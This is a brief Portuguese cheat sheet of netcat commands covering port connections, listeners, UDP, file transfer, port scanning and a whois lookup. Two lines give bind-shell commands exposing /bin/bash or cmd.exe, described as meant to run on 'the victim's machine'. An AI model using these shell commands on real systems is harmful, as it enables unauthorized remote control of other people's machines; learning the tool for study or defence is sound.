# NC
Pode ser usado: nc | ncat | netcat.

nc ==> Executa o netcat.
nc -h ==> Help do netcat.
nc 172.16.1.4 110 ==> Conecta no IP 172.16.1.4 na porta 110 TCP.
nc www.grandbusiness.com.br 21 ==> Conecta ao site através da porta 21.
nc -v 172.16.1.4 ==> Verbose mode.
netstat -nlpt ==> Verifica portas abertas no sistema.
nc -vlp 5050 ==> -v [verbose mode], l [listening], p [port], abertura de porta.
nc -vlup 9000 ==> -v [verbose mode], l [listening], u [UDP], p [port], abertura de porta.
nc -u 127.0.0.1 9000 ==> Conecta na porta 9000 UDP no IP 127.0.0.1.
nc -vlp 80 < servidor.txt ==> Envia o arquivo "servidor.txt" na conexão.
nc -lnvp 5050 > ncat.exe ==> Envia tudo que chegar para o arquivo ncat.exe.
nc -vn 192.168.0.105 5050 < ncat.exe ==> Envia o arquivo "ncat.exe" na conexão.

nc -vnlp 5050 -e /bin/bash ==> Executa o /bin/bash
nc -vnlp 5050 -e cmd.exe ==> Executa o CMD
* Os dois comandos acima são um modelo de shell simples onde devem ser executadas na máquina da vítima.

Escaneando portas:  
``nc -vnz 172.16.1.5 19-30`` Será escaneado da porta 19 atá a 30.  
``nc -vnz 172.16.1.5 22`` Será escaneado somente a porta 22.

Vericando whois pelo NC:  
``nc -v 200.160.2.3 43  
globo.com``
* A porta 43 é utilizada pelo WHOIS.
* O IP 200.160.2.3 é do registro.br.
